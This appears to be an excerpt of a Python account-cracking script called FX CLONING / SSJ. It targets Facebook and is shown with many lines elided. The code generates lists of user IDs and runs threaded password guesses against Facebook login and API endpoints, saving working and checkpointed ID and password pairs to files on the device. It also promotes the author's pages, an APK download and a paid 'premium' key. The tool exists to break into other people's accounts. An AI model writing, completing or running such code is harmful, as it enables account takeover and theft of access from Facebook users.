...
os.system('xdg-open https://www.facebook.com/profile.php?id=foysalhasanfahim13 ')
print('\n\033[1;37m Follow my facbook page...\n It will take some seconds...')
...
----------------------------------------------
 ...
 Tool Name : FX CLONING
 Type type : FREE
 Version   : 1.0
----------------------------------------------
 FB CLONNING GIT BY FAHIM
 I AM A KING 👑
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last,firtslast,first 123,last123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SSJ_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/foysalhasanfahim13/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use FX ')
                        else:
                        ...
                        linex()
                        tks = ("Hi  Sir, I Need To Buy Your Paid FX PRO Tools Version 1.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SSJ.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SSJ:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SSJ-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SSJ=session.cookies.get_dict().keys()
                        if "c_user" in SSJ:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SSJ-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SSJ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SSJ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SSJ-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SSJ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SSJ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SSJ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SSJ-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SSJ-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SSJ-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SSJ-OK] '+uid+' | '+pas+'\033[1;97m')
